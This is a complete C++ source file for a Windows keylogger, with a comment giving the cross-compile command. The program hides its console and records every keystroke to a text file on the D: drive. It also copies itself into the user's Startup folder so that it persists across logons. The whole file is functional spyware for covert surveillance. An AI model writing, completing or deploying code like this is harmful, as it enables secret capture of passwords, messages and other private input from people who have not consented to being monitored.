// Compilar -> x86_64-w64-mingw32-g++ -static-libgcc -static-libstdc++ -o keylogger.exe keylogger2.cpp -luser32
#include <windows.h>
#include <fstream>
#include <ctime>
#include <string>

using namespace std;

void logkey(int key_stroke, const char *file);
int autoRun();

int main() {
    char i;
    FreeConsole();
    autoRun();

    while (true) {
        for (i = 8; i <= 190; i++) {
            if (GetAsyncKeyState(i) == -32767) {
                logkey(i, "D:\\keylogger.txt");
            }
        }
    }

    return 0;
}

void logkey(int key_stroke, const char *file) {
    if ((key_stroke == 1) || (key_stroke == 2)) {
        return;
    }
    
    ofstream output_file;
    output_file.open(file, ios_base::app);

    if (!output_file.is_open()) {
        return;
    }

    if(key_stroke == 8) {
        output_file << "[BACKSPACE]";
        Sleep(100);
    } else if (key_stroke == 13) {
        output_file << "[ENTER]\n";
        Sleep(100);
    } else if (key_stroke == 32) {
        output_file << " ";
        Sleep(100);
    } else if (key_stroke == VK_SHIFT) {
        output_file << "[SHIFT]";
        Sleep(100);
    } else if (key_stroke == VK_CONTROL) {
        output_file << "[CTRL]";
        Sleep(100);
    } else if (key_stroke == VK_MENU) {
        output_file << "[ALT]";
        Sleep(100);
    } else if (key_stroke >= 65 && key_stroke <= 90) {
        bool shift_pressed = GetAsyncKeyState(VK_SHIFT) & 0x8000;
        char letter = (shift_pressed) ? key_stroke : tolower(key_stroke);
        output_file << letter;
        Sleep(100);
    } else {
        output_file << char(key_stroke);
        Sleep(100);
    }

    output_file.close();
}

int autoRun() {
    char fullPath[MAX_PATH];
    GetModuleFileName(NULL, fullPath, MAX_PATH);
    std::string programDirectory = fullPath;
    size_t pos = programDirectory.find_last_of("\\/");
    if (pos != std::string::npos) {
        programDirectory = programDirectory.substr(0, pos);
    }

    std::string sourcePath = std::string(programDirectory) + "\\keylogger.exe";

    char appDataPath[MAX_PATH];
    if (GetEnvironmentVariable("APPDATA", appDataPath, MAX_PATH) == 0) {
        return 1;
    }
    std::string destinationPath = std::string(appDataPath) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\keylogger.exe";

    BOOL result = CopyFile(sourcePath.c_str(), destinationPath.c_str(), FALSE);
    return 0;
}